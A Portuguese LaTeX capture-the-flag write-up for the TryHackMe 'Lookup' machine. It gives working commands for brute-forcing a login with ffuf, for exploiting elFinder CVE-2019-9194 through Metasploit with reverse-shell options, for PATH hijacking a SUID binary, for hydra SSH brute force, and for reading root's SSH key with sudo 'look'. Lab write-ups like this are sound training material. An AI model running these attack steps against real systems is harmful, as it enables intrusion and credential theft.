@@ -1,0 +1,410 @@
+\documentclass[12pt]{article}
+
+% pacotes obrigatorios e formatacao
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage[brazil]{babel}
+\usepackage[margin=2cm]{geometry} % margem minima de 2cm exigida pela metodologia
+\usepackage{times} % fonte times new roman
+\usepackage{graphicx}
+\usepackage{booktabs}
+\usepackage{xcolor}
+\usepackage{listings}
+\usepackage{fancyhdr}
+\usepackage{hyperref}
+\usepackage{float}
+
+\definecolor{citapurple}{HTML}{6A1B9A} % tom roxo escuro
+% configuracao de links (hierarquia e cores)
+\hypersetup{
+    colorlinks=true,
+    linkcolor=black,       % cor para sumario, figuras (\ref) e secoes
+    urlcolor=blue,         % cor para links de internet (\url, \href)
+    citecolor=citapurple,  % cor para citacoes bibliograficas (\cite) em roxo
+    pdftitle={WriteUp - CTF},
+}
+
+
+% configuracao dos blocos de codigo (monoespacado com fundo destacado)
+\definecolor{codebg}{gray}{0.95}
+\lstset{
+    backgroundcolor=\color{codebg},
+    basicstyle=\ttfamily\small,
+    breaklines=true,
+    frame=single,
+    frameround=tttt,
+    framesep=5pt,
+    rulecolor=\color{gray!30},
+    showstringspaces=false,
+    keywordstyle=\color{blue},
+    captionpos=b,
+    inputencoding=utf8,
+    extendedchars=true
+    }
+    
+    % configuracao de cabecalho e rodape
+    \pagestyle{fancy}
+    \fancyhf{}
+    \lhead{\small \textit{Lookup - Try Hack Me}}
+    \rhead{\small \textit{Autor: Lurian Lima (luricl)}}
+    \rfoot{\thepage} % numeracao de paginas obrigatoria
+    
+    \begin{document}
+    
+% \begin{figure}[h!]
+%     \centering
+%     % substitua 'example-image' pelo screenshot real
+%     \includegraphics[width=0.45\textwidth]{example-image}
+%     \caption{Servicos identificados no alvo via Nmap.}
+%     \label{fig:nmap}
+% \end{figure}
+
+% 2.1. capa
+\begin{titlepage}
+    \centering
+    \vspace*{2cm}
+    
+    {\Huge \textbf{Nome da Máquina: Lookup}}\\[0.5cm]
+    {\large \textbf{Plataforma:} Try Hack Me}\\[1.5cm]
+    
+    \vfill
+    
+    % espaco dedicado para logotipo (plataforma, unbreakable ou da máquina)
+    \begin{figure}[h!]
+        \centering
+        % substitua 'example-image' pelo arquivo da logo na pasta do projeto
+        \includegraphics[width=0.32\textwidth]{../template-writeup-unbreakable/unbreakableLogo_3.png} 
+    \end{figure}
+    
+    \vfill
+    
+    \begin{table}[h!]
+        \centering
+        \small
+        \renewcommand{\arraystretch}{1.3}
+        \begin{tabular}{ll}
+            \textbf{Máquina / Desafio:} & Lookup \\
+            \textbf{Dificuldade:}       & Fácil \\
+            \textbf{Autor:}             & Lurian Lima (luricl) \\
+            \textbf{Matrícula:}         & 222005395 \\
+        \end{tabular}
+    \end{table}
+    
+    \vspace*{1.5cm}
+    {\large \today}
+\end{titlepage}
+
+\newpage
+
+% 2.2. sumario
+% indice gerado automaticamente com numeracao de paginas
+\tableofcontents
+\newpage
+
+% 2.3. visao geral
+% paragrafo descrevendo o vetor principal de ataque sem spoiler detalhado.
+% deve responder: o que e o desafio, qual a superficie explorada e o caminho geral ate o objetivo.
+\section{Visão Geral}
+
+A \textbf{Lookup} é uma máquina Linux do tipo \textit{boot2root} do TryHackMe, classificada como fácil. A superfície externa expõe apenas SSH (porta 22) e um servidor web Apache (porta 80), que redireciona para o \textit{vhost} \texttt{lookup.thm}. O vetor de entrada parte de uma tela de login que, por retornar mensagens de erro distintas para usuário inválido e para senha incorreta, permite a enumeração de usuários válidos; de posse de um usuário, um ataque de força bruta revela sua senha. O acesso autenticado conduz a um gerenciador de arquivos \textit{elFinder} em versão vulnerável, cuja exploração concede o shell inicial como \texttt{www-data}. A movimentação lateral abusa de um binário SUID personalizado (\texttt{pwm}) por meio de sequestro da variável \texttt{PATH}, recuperando as credenciais do usuário \texttt{think}. A escalada final explora uma permissão \texttt{sudo} sobre o utilitário \texttt{look} para ler a chave SSH privada do \texttt{root}.
+
+% 2.4. reconhecimento
+% resultados da enumeracao externa: portas abertas, servicos e versoes relevantes identificadas.
+% incluir comandos executados em blocos de codigo e outputs truncados pertinentes.
+% regra: nao incluir informacoes obtidas apos o foothold inicial.
+\section{Reconhecimento}
+
+Iniciando com o nmap.
+
+\begin{lstlisting}[caption={Varredura de portas com Nmap}, label={lst:nmap}]
+$ nmap -sC -sV -T4 <TARGET_IP>
+...
+PORT      STATE    SERVICE       VERSION
+22/tcp    open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 6d:1f:60:6c:98:1f:df:f8:47:79:fb:22:52:c0:85:d6 (RSA)
+|   256 5b:83:31:26:1d:80:b0:1c:53:a0:14:5f:33:af:f9:0c (ECDSA)
+|_  256 96:0b:96:62:a1:92:6f:61:6c:29:3c:8f:3f:08:3e:13 (ED25519)
+|_rpcinfo: ERROR: Script execution failed (use -d to debug)
+|_vmware-version: ERROR: Script execution failed (use -d to debug)
+80/tcp    open     http          Apache httpd 2.4.41 ((Ubuntu))
+|_rpcinfo: ERROR: Script execution failed (use -d to debug)
+|_http-title: Did not follow redirect to http://lookup.thm
+...
+\end{lstlisting}
+
+Há um servidor apache que podemos acessar pelo navegador, mas para isso teremos que atualizar o \textit{/etc/hosts} para acessar o vhost.
+
+% 2.5. exploracao
+% descricao tecnica detalhada do vetor de entrada e raciocinio que levou a vulnerabilidade.
+% incluir scripts, exploits ou payloads utilizados (comentados) e justificativa dos passos.
+% prints obrigatorios evidenciando o acesso inicial obtido (com placeholder para dados sensiveis).
+\section{Exploração}
+
+Ao acessar o servidor, após atualizar \textit{/etc/hosts}, encontramos uma tela de login que retorna o seguinte erro ao tentarmos credenciais aleatórias:
+
+\begin{figure}[H]
+    \centering
+    % substitua 'example-image' pelo screenshot real
+    \includegraphics[width=0.7\textwidth]{imgs/erro_login_lookup.png}
+    \caption{Erro na tela de login.}
+    \label{fig:nmap}
+\end{figure}
+
+No entanto, se tentarmos o usuário "admin", recebemos a mensagem "Wrong password. Please try again.".
+
+Portanto, podemos usar o ffuf para testar várias combinações.
+
+\begin{lstlisting}[caption={comando ffuf para testar várias combinações de usuário e senha. Foi aplicado um filtro para detectar a entrada que gera uma resposta de tamanho diferente do padrão}, label={lst:ffuf}]
+ffuf -w /snap/seclists/current/Passwords/Common-Credentials/xato-net-10-million-passwords-100000.txt -X POST -u http://lookup.thm/login.php -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fs 62
+\end{lstlisting}
+
+Assim, conseguimos encontrar uma senha:
+
+\begin{figure}[H]
+    \centering
+    % substitua 'example-image' pelo screenshot real
+    \includegraphics[width=0.7\textwidth]{imgs/output_ffuf.png}
+    \caption{Senha encontrada.}
+    \label{fig:password}
+\end{figure}
+
+Porém, o servidor continua retornando erro. Portanto, dessa vez vale tentar manter a senha encontrada e fazer fuzzing do nome do usuário.
+
+\begin{lstlisting}[caption={comando ffuf para testar várias combinações de usuário. Foi aplicado um filtro para detectar a entrada que gera uma resposta de tamanho diferente do padrão de tamanho 74}, label={lst:user_ffuf}]
+$ ffuf -w /snap/seclists/current/Passwords/Common-Credentials/10k-most-common.txt -X POST -u http://lookup.thm/login.php -d "username=FUZZ&password=password123" -H "Content-Type: application/x-www-form-urlencoded" -fs 74
+\end{lstlisting}
+
+Assim, conseguimos encontrar um usuário que corresponde à senha encontrada
+
+\begin{figure}[H]
+    \centering
+    % substitua 'example-image' pelo screenshot real
+    \includegraphics[width=0.7\textwidth]{imgs/user_output_ffuf_lookup.png}
+    \caption{Usuário correspondente à senha encontrada.}
+    \label{fig:user_jose}
+\end{figure}
+
+No entanto, ao tentar fazer o login com as credenciais encontradas, encontramos uma tela de erro. 
+
+\begin{figure}[H]
+    \centering
+    % substitua 'example-image' pelo screenshot real
+    \includegraphics[width=0.7\textwidth]{imgs/login_jose.png}
+    \caption{Tela após login com as credenciais achadas.}
+\end{figure}
+
+Pois também temos que adicionar a url files.lookup.thm ao etc/hosts/
+
+\begin{figure}[H]
+    \centering
+    % substitua 'example-image' pelo screenshot real
+    \includegraphics[width=0.7\textwidth]{imgs/elfinder.png}
+    \caption{Tela após logar como jose.}
+\end{figure}
+
+Explorando a tela, encontramos a versão da aplicação rodando
+
+\begin{figure}[H]
+    \centering
+    % substitua 'example-image' pelo screenshot real
+    \includegraphics[width=0.7\textwidth]{imgs/elfinder_version.png}
+    \caption{Versão da aplicação rodando.}
+\end{figure}
+
+Com base nisso, podemos procurar por uma CVE
+
+\begin{figure}[H]
+    \centering
+    % substitua 'example-image' pelo screenshot real
+    \includegraphics[width=0.7\textwidth]{imgs/searchsploit_elfinder.png}
+    \caption{Procurando vulnerabilidades com searchsploit.}
+\end{figure}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.7\textwidth]{imgs/elfinder_metasploit_options.png}
+    \caption{Opções do metasploit.}
+\end{figure}
+
+No metasploit, há algumas opções que precisam ser configuradas.
+
+\begin{lstlisting}
+set RHOSTS <IP_DO_ALVO>
+set VHOST files.lookup.thm
+set TARGETURI /elFinder/
+set LHOST <seu_IP_tun0>
+set LPORT 4444
+check
+\end{lstlisting}
+
+Após isso, podemos acessar o servidor remotamente
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.7\textwidth]{imgs/elfinder_metasploit_result.png}
+    \caption{Conexão remota com o servidor.}
+\end{figure}
+
+O módulo explora uma injeção de comando no conector PHP do elFinder, presente nas versões anteriores à 2.1.48 (CVE-2019-9194). Ao executar \texttt{run}, o Metasploit envia uma imagem cujo \textit{nome de arquivo} carrega o comando malicioso e, em seguida, dispara a rotação da imagem --- operação que internamente invoca o utilitário \texttt{exiftran} sobre esse nome não sanitizado, fazendo o servidor executar o \textit{payload}. Como resultado, obtemos uma sessão Meterpreter como o usuário \texttt{www-data}, dando início à fase de pós-exploração.
+
+% 2.6. movimentacao lateral (se aplicavel)
+% aplicavel quando ha multiplos usuarios no sistema ou necessidade de pivoting entre servicos.
+% detalhar a escalada horizontal com comandos, raciocinio e evidencias necessarias.
+\section{Movimentação Lateral}
+
+Com o shell de \texttt{www-data} obtido, iniciamos a enumeração local. Inspecionando o \textit{/etc/passwd}, identificamos, além do \texttt{root}, um usuário \texttt{think} com shell válido:
+
+\begin{lstlisting}[caption={Usuários com shell no /etc/passwd}, label={lst:passwd}]
+www-data@lookup:/$ cat /etc/passwd | grep sh$
+root:x:0:0:root:/root:/usr/bin/bash
+think:x:1000:1000:,,,:/home/think:/bin/bash
+\end{lstlisting}
+
+No diretório \textit{home} de \texttt{think} há um arquivo \textit{.passwords} que parece interessante, mas que não temos permissão de ler como \texttt{www-data}:
+
+\begin{lstlisting}[caption={Conteúdo do /home/think}, label={lst:homethink}]
+www-data@lookup:/$ ls -la /home/think
+-rw-r----- 1 root think  525 Jul 30  2023 .passwords
+-rw-r--r-- 1 root think   33 Jul 30  2023 user.txt
+\end{lstlisting}
+
+Partimos então para a busca por binários SUID, que executam com os privilégios do dono em vez dos de quem os chama:
+
+\begin{lstlisting}[caption={Busca por binários SUID}, label={lst:suid}]
+www-data@lookup:/$ find / -perm /4000 2>/dev/null
+...
+/usr/sbin/pwm
+...
+\end{lstlisting}
+
+O binário \texttt{/usr/sbin/pwm} chama a atenção por não ser padrão do sistema. Ele é SUID e pertence ao \texttt{root}:
+
+\begin{lstlisting}[caption={Permissões do binário pwm}, label={lst:pwmperm}]
+www-data@lookup:/$ ls -la /usr/sbin/pwm
+-rwsr-sr-x 1 root root 17176 Jan 11  2024 /usr/sbin/pwm
+\end{lstlisting}
+
+Ao executá-lo, observamos seu comportamento: ele roda o comando \texttt{id}, extrai o nome do usuário da saída e tenta ler o arquivo \textit{/home/<usuário>/.passwords}:
+
+\begin{lstlisting}[caption={Execução do pwm como www-data}, label={lst:pwm1}]
+www-data@lookup:/$ /usr/sbin/pwm
+[!] Running 'id' command to extract the username and user ID (UID)
+[!] ID: www-data
+[-] File /home/www-data/.passwords not found
+\end{lstlisting}
+
+O ponto fraco é que o \texttt{pwm} invoca \texttt{id} \textbf{sem caminho absoluto}. Assim, a resolução do binário segue a variável \texttt{PATH} do nosso ambiente, e podemos antepor um diretório sob nosso controle para que um \texttt{id} falso seja executado no lugar do real --- técnica conhecida como \textit{PATH hijacking}. Criamos um \texttt{id} que devolve \texttt{think} como usuário:
+
+\begin{lstlisting}[caption={Sequestro do PATH e criação de um id falso}, label={lst:pathhijack}]
+www-data@lookup:/$ export PATH=/tmp:$PATH
+www-data@lookup:/$ cat /tmp/id
+#!/bin/bash
+echo "uid=33(think) gid=33(think) groups=33(think)"
+www-data@lookup:/$ chmod +x /tmp/id
+\end{lstlisting}
+
+Ao rodar o \texttt{pwm} novamente, ele extrai \texttt{think} como usuário e nos devolve o conteúdo de \textit{/home/think/.passwords} --- uma lista de senhas candidatas:
+
+\begin{lstlisting}[caption={pwm enganado revela a lista de senhas de think}, label={lst:pwm2}]
+www-data@lookup:/$ /usr/sbin/pwm
+[!] Running 'id' command to extract the username and user ID (UID)
+[!] ID: think
+jose1006
+jose1004
+jose1002
+...
+\end{lstlisting}
+
+Salvamos essa lista em um arquivo e usamos o \texttt{hydra} para um ataque de força bruta no SSH do usuário \texttt{think}:
+
+\begin{lstlisting}[caption={Força bruta SSH em think com a lista recuperada}, label={lst:hydrathink}]
+$ hydra -l think -P passwords.txt lookup.thm ssh -V
+[22][ssh] host: lookup.thm   login: think   password: <REDIGIDO>
+\end{lstlisting}
+
+Com a senha encontrada, acessamos a máquina via SSH como \texttt{think} e confirmamos a identidade, capturando também a primeira flag:
+
+\begin{lstlisting}[caption={Acesso como think}, label={lst:thinkssh}]
+think@lookup:~$ id
+uid=1000(think) gid=1000(think) groups=1000(think)
+think@lookup:~$ cat user.txt
+THM{<FLAG_DE_USUARIO>}
+\end{lstlisting}
+
+% 2.7. escalada de privilegios
+% descrever o vetor de privesc vertical, o processo de enumeracao local que o revelou
+% (ex: linpeas, sudo -l, capabilities, binarios suid) e a exploracao realizada.
+% incluir o comando final e captura que comprove o acesso root/system e as flags com placeholder.
+\section{Escalada de Privilégios}
+
+Como \texttt{think}, verificamos quais comandos o usuário pode executar com \texttt{sudo}:
+
+\begin{lstlisting}[caption={Privilégios sudo de think}, label={lst:sudol}]
+think@lookup:~$ sudo -l
+Matching Defaults entries for think on lookup:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User think may run the following commands on lookup:
+    (ALL) /usr/bin/look
+\end{lstlisting}
+
+O usuário pode rodar \texttt{/usr/bin/look} como \texttt{root}. Consultando o \textit{GTFOBins}, vemos que o \texttt{look} pode ser usado para ler arquivos arbitrários; como a execução é feita como \texttt{root}, conseguimos ler qualquer arquivo do sistema:
+
+\begin{lstlisting}[caption={Técnica do look segundo o GTFOBins}, label={lst:gtfolook}]
+LFILE=file_to_read
+sudo look '' "$LFILE"
+\end{lstlisting}
+
+O caminho mais rápido para o \texttt{root} é ler sua chave SSH privada:
+
+\begin{lstlisting}[caption={Leitura da chave SSH do root via look}, label={lst:rootkey}]
+think@lookup:~$ sudo /usr/bin/look '' /root/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAA...
+-----END OPENSSH PRIVATE KEY-----
+\end{lstlisting}
+
+Salvamos a chave em nossa máquina de ataque, ajustamos as permissões e acessamos como \texttt{root}, capturando a flag final:
+
+\begin{lstlisting}[caption={Acesso final como root}, label={lst:rootssh}]
+$ chmod 600 id_rsa
+$ ssh -i id_rsa root@lookup.thm
+root@lookup:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@lookup:~# cat /root/root.txt
+THM{<FLAG_DE_ROOT>}
+\end{lstlisting}
+
+% 2.8. conclusao
+% resumo tecnico de 3 a 5 linhas sintetizando a cadeia de exploracao completa,
+% do reconhecimento a captura final da flag.
+\section{Conclusão}
+
+A exploração da Lookup encadeou quatro falhas que, no fundo, compartilham um mesmo tema: a confiança indevida em entradas ou configurações não validadas. O reconhecimento revelou apenas SSH e um Apache redirecionando para \texttt{lookup.thm}. Na tela de login, mensagens de erro distintas para usuário inválido e senha incorreta permitiram enumerar o usuário \texttt{jose} e, por força bruta, descobrir sua senha. O acesso autenticado expôs um \textit{elFinder} 2.1.47 vulnerável (CVE-2019-9194), cuja injeção de comando concedeu o \textit{foothold} como \texttt{www-data}. A movimentação lateral abusou do binário SUID \texttt{pwm}, que invocava \texttt{id} por caminho relativo, permitindo um \textit{PATH hijacking} para recuperar a senha de \texttt{think}. Por fim, uma permissão \texttt{sudo} mal configurada sobre o utilitário \texttt{look} possibilitou a leitura da chave SSH privada do \texttt{root}, concluindo o comprometimento total da máquina.
+
+\section{Referências}
+
+% 2.9. referencias
+% espaco destinado as fontes utilizadas para a exploracao:
+% links dos repositorios de exploits publicos, documentacoes e cves correspondentes.
+\begin{thebibliography}{9}
+    \bibitem{elfinder}
+    \textbf{elFinder PHP Connector --- Command Injection (CVE-2019-9194)}: injeção de comando no conector PHP do elFinder em versões anteriores à 2.1.48, explorada via rotação de imagem (\texttt{exiftran}). Módulo Metasploit \texttt{exploit/unix/webapp/elfinder\_php\_connector\_exiftran\_cmd\_injection}. \\
+    Disponível em: \url{https://nvd.nist.gov/vuln/detail/CVE-2019-9194}
+
+    \bibitem{gtfolook}
+    \textbf{GTFOBins --- look}: uso do binário \texttt{look} com \texttt{sudo} para leitura arbitrária de arquivos do sistema. \\
+    Disponível em: \url{https://gtfobins.github.io/gtfobins/look/}
+
+    \bibitem{thmroom}
+    \textbf{TryHackMe --- Lookup}: sala de origem do desafio. \\
+    Disponível em: \url{https://tryhackme.com/room/lookup}
+
+    \bibitem{walkthrough}
+    \textbf{TheHiker --- Lookup TryHackMe Walkthrough}: referência utilizada como apoio para a cadeia de exploração. \\
+    Disponível em: \url{https://medium.com/@The_Hiker/lookup-tryhackme-walkthrough-thehiker-9276508b7d84}
+
+\end{thebibliography}
+
+\end{document}
